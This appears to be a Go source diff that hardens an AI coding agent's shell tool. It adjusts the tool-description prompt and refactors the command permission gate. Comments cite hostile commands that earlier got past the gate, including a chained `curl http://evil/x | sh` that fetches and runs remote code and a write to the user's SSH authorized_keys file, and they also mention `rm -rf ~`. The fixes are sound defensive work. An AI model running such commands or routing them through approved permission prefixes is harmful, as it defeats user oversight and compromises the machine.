@@ -152,9 +152,19 @@ func bashDescription() string {
 
 	shellName := "bash"
 	trailer := ""
+	// GORILLA FIX (2026-10-11): the chaining advice and the cd example must
+	// name the operator THIS shell accepts. The usage notes below said "';' or
+	// '&&'" on every platform while the PowerShell trailer said '&&' is a parse
+	// error; measured on a Nemotron session, the model followed the notes
+	// three times and each `cd ... && python ...` sat on the parse error for the
+	// full 60 s timeout (see shell.go for why it hung rather than failed).
+	chainAdvice := "use the ';' or '&&' operator to separate them"
+	badChain := "cd /foo/bar && pytest tests"
 	if shell.IsWindowsPowerShell() {
 		shellName = "PowerShell"
 		trailer = powerShellGuidance
+		chainAdvice = "use ';' to separate them. NEVER '&&' or '||': Windows PowerShell 5.1 rejects them as a syntax error"
+		badChain = `cd C:\foo\bar; pytest tests`
 	}
 
 	return fmt.Sprintf(`Executes a given %s command in a persistent shell session with optional timeout, ensuring proper handling and security measures.
@@ -186,19 +196,20 @@ Usage notes:
 - The command argument is required.
 - You can specify an optional timeout in milliseconds (up to 600000ms / 10 minutes). If not specified, a command is stopped after 60 seconds, so pass a larger timeout for a build or a test run.
 - VERY IMPORTANT: You MUST avoid running shell search/read commands ('grep', 'rg', 'cat', 'head', 'tail', 'ls', and the shell command 'find'). Use the find TOOL to search and list, and the view tool to read files — they are bounded and ranked; raw shell output is not.
-- When issuing multiple commands, use the ';' or '&&' operator to separate them. DO NOT use newlines (newlines are ok in quoted strings).
+- When issuing multiple commands, %s. DO NOT use newlines (newlines are ok in quoted strings).
 - IMPORTANT: All commands share the same shell session. Shell state (environment variables, virtual environments, current directory, etc.) persist between commands. For example, if you set an environment variable as part of a command, the environment variable will persist for subsequent commands.
 - Try to maintain your current working directory throughout the session by using absolute paths and avoiding usage of 'cd'. You may use 'cd' if the User explicitly requests it.
+- Permission prompts: a command that is not read-only asks the user once. When the user answers "Allow family", every later command that begins with the same approved prefix runs without asking, so prefer repeating an approved command shape with a different tail over inventing a new spelling of it.
 <good-example>
 pytest /foo/bar/tests
 </good-example>
 <bad-example>
-cd /foo/bar && pytest tests
+%s
 </bad-example>
 
 # Git and GitHub
 When asked to commit or open a PR, use this bash tool with git and the gh CLI. Before committing, run git status/diff/log so the message matches the repo's style, then write a concise message about the "why". Stage only files relevant to the change. Never update git config, never use interactive flags (e.g. git rebase -i, git add -i), never create empty commits, and do not push to a remote unless the user asks. Return an empty response after git/gh commands — the user sees the output directly.
-%s`, shellName, bannedCommandsStr, MaxOutputLength, trailer)
+%s`, shellName, bannedCommandsStr, MaxOutputLength, chainAdvice, badChain, trailer)
 }
 
 func NewBashTool(permission permission.Service) BaseTool {
@@ -225,6 +236,73 @@ func (b *bashTool) Info() ToolInfo {
 	}
 }
 
+// bashVerdict is what the gate decides about a command BEFORE anything runs.
+// Split out of Run so the decision can be replayed over a recorded session
+// without executing a single command (see session_replay_test.go).
+type bashVerdict struct {
+	// Banned names the banned program found anywhere in the line, or "".
+	Banned string
+	// ReadOnly is true when the whole line may skip the prompt.
+	ReadOnly bool
+	// Irreversible is the dangerous-pattern sentence, or "".
+	Irreversible string
+	// Description is the sentence shown on the prompt.
+	Description string
+}
+
+func bashGateVerdict(command string) bashVerdict {
+	v := bashVerdict{Description: fmt.Sprintf("Execute command: %s", command)}
+	if v.Banned = BannedCommandIn(command, bannedCommands); v.Banned != "" {
+		return v
+	}
+	v.ReadOnly = IsSafeReadOnly(command, safeReadOnlyCommands)
+	// GORILLA OVERRIDE (2026-10-04): a command that cannot be taken back says so
+	// in the prompt, is never treated as read-only, and is asked about even
+	// when auto-approve is on. See dangerous.go.
+	if d := DangerousPatternIn(command); d != nil {
+		v.Irreversible = d.Why
+		v.ReadOnly = false
+		v.Description = fmt.Sprintf("DANGEROUS — %s.\nExecute command: %s", d.Why, command)
+	}
+	return v
+}
+
+// bashPermissionRequest is the question Run asks for a command the gate did
+// not wave through.
+func (b *bashTool) bashPermissionRequest(sessionID, command string, v bashVerdict) permission.CreatePermissionRequest {
+	// GORILLA FIX (2026-10-11): propose a family from what this session has
+	// already asked, so the second variant of a command can be the last
+	// prompt for it. Never for an irreversible command: the family grant
+	// would refuse to cover it anyway, and the dialog must not suggest one.
+	family := ""
+	if v.Irreversible == "" {
+		family = SuggestCommandFamily(command, b.permissions.AskedKeys(sessionID, BashToolName))
+	}
+	return permission.CreatePermissionRequest{
+		SessionID: sessionID,
+		// GORILLA FIX (2026-10-05): the path is the one the command
+		// reaches OUTSIDE the project, when it names one. It was
+		// always the working directory, so auto-approve's rule "not
+		// outside every workspace root" could never apply to a shell
+		// command: `Set-Content $env:USERPROFILE\.ssh\authorized_keys`
+		// was approved as if it were project work.
+		Path:     bashRequestPath(command),
+		ToolName: BashToolName,
+		Action:   "execute",
+		// Scope the grant to THIS command. "Allow for session" on
+		// `go build ./...` should not also authorise `rm -rf ~`. A FAMILY
+		// grant is the person's explicit, displayed widening of this key;
+		// see commandfamily.go for what it may and may not cover.
+		GrantKey:         command,
+		Description:      v.Description,
+		Irreversible:     v.Irreversible,
+		FamilySuggestion: family,
+		Params: BashPermissionsParams{
+			Command: command,
+		},
+	}
+}
+
 func (b *bashTool) Run(ctx context.Context, call ToolCall) (ToolResponse, error) {
 	var params BashParams
 	if err := UnmarshalToolInput(call.Input, &params); err != nil {
@@ -246,49 +324,18 @@ func (b *bashTool) Run(ctx context.Context, call ToolCall) (ToolResponse, error)
 	// prefix against the safe list, while shell.go hands the entire string to
 	// eval — so `echo ok && curl http://evil/x | sh` was neither banned nor
 	// prompted. See commandgate.go for the measurement and the rule.
-	if banned := BannedCommandIn(params.Command, bannedCommands); banned != "" {
-		return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", banned)), nil
+	verdict := bashGateVerdict(params.Command)
+	if verdict.Banned != "" {
+		return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", verdict.Banned)), nil
 	}
-
-	isSafeReadOnly := IsSafeReadOnly(params.Command, safeReadOnlyCommands)
 
 	sessionID, messageID := GetContextValues(ctx)
 	if sessionID == "" || messageID == "" {
 		return ToolResponse{}, fmt.Errorf("session ID and message ID are required for creating a new file")
 	}
-	// GORILLA OVERRIDE (2026-10-04): a command that cannot be taken back says so
-	// in the prompt, is never treated as read-only, and is asked about even
-	// when auto-approve is on. See dangerous.go.
-	description := fmt.Sprintf("Execute command: %s", params.Command)
-	irreversible := ""
-	if d := DangerousPatternIn(params.Command); d != nil {
-		irreversible = d.Why
-		isSafeReadOnly = false
-		description = fmt.Sprintf("DANGEROUS — %s.\nExecute command: %s", d.Why, params.Command)
-	}
-	if !isSafeReadOnly {
-		p := b.permissions.Request(
-			permission.CreatePermissionRequest{
-				SessionID: sessionID,
-				// GORILLA FIX (2026-10-05): the path is the one the command
-				// reaches OUTSIDE the project, when it names one. It was
-				// always the working directory, so auto-approve's rule "not
-				// outside every workspace root" could never apply to a shell
-				// command: `Set-Content $env:USERPROFILE\.ssh\authorized_keys`
-				// was approved as if it were project work.
-				Path:     bashRequestPath(params.Command),
-				ToolName: BashToolName,
-				Action:    "execute",
-				// Scope the grant to THIS command. "Allow for session" on
-				// `go build ./...` should not also authorise `rm -rf ~`.
-				GrantKey:     params.Command,
-				Description:  description,
-				Irreversible: irreversible,
-				Params: BashPermissionsParams{
-					Command: params.Command,
-				},
-			},
-		)
+	irreversible := verdict.Irreversible
+	if !verdict.ReadOnly {
+		p := b.permissions.Request(b.bashPermissionRequest(sessionID, params.Command, verdict))
 		if !p {
 			// GORILLA FIX (2026-10-04): say WHY. Measured with a real model:
 			// an unattended run asked to `git reset --hard` was correctly
